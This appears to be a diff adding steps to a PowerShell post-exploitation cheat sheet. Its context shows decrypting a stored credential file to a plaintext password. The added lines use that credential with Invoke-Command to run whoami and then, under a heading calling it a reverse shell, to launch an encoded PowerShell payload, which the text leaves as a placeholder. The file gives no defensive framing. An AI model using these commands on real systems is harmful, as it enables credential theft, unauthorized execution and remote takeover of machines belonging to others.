@@ -16,3 +16,11 @@ $cred.GetNetworkCredential().password
 ```language
 (Import-Clixml "C:\Path\To\Your\connection.xml").GetNetworkCredential().Password
 ```
+# Verify it
+```language
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } 2>&1
+```
+# Reverse shell as that user
+```language
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { powershell -enc <encoded code here> } 2>&1
+```
